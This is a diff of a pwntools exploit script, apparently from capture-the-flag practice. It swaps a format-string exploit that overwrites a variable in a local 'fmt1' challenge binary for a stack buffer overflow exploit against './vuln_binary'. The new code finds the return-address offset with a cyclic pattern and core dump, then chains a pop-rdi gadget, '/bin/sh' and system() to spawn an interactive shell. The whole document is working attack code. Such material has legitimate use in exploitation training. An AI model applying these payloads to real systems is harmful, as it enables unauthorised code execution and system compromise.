@@ -1,30 +1,52 @@
 from pwn import *
-# Set up the process and context
-binary_path = './pwn/string/fmt-1/fmt1'
-binary = ELF(binary_path)
-context.binary = binary
+def find_offset():
+    # Start the process
+    p = process('./vuln_binary')
+    
+    # Generate a pattern to find the offset
+    pattern = cyclic(1024)
+    
+    # Send the pattern
+    p.sendline(pattern)
+    
+    # Wait for the process to crash
+    p.wait()
+    
+    # Get the core dump
+    core = p.corefile
+    
+    # Find the offset
+    offset = cyclic_find(core.read(core.rsp, 4))
+    
+    # Return the offset
+    return offset
 
-# Step 1: Generate a unique pattern
-pattern = cyclic(100)
 
-# Step 2: Send the pattern to the binary
-p = process(binary_path)
-p.sendline(pattern)
-p.wait()
+# Find the offset to the saved return address
+offset = find_offset()
+log.info(f'Offset to saved return address: {offset}')
 
-# Step 3: Get the core dump and find the offset
-core = Coredump('./core')
-offset = cyclic_find(core.eip)
 
-# Step 4: Create the payload to overwrite the value of x with 4
-x_addr = binary.symbols['x']
-payload = fmtstr_payload(offset, {x_addr: 4})
+# Define the target binary
+binary = ELF('./vuln_binary')
 
-# Main exploitation logic
-def exploit():
-    p = process(binary_path)
-    p.sendline(payload)
-    p.interactive()
+# Find a gadget to pop a shell
+rop = ROP(binary)
+pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
+bin_sh = next(binary.search(b'/bin/sh'))
+system = binary.symbols['system']
 
-if __name__ == '__main__':
-    exploit()
+# Craft the payload
+payload = b'A' * offset
+payload += p64(pop_rdi)
+payload += p64(bin_sh)
+payload += p64(system)
+
+# Start the process
+p = process('./vuln_binary')
+
+# Send the payload
+p.sendline(payload)
+
+# Interact with the shell
+p.interactive()
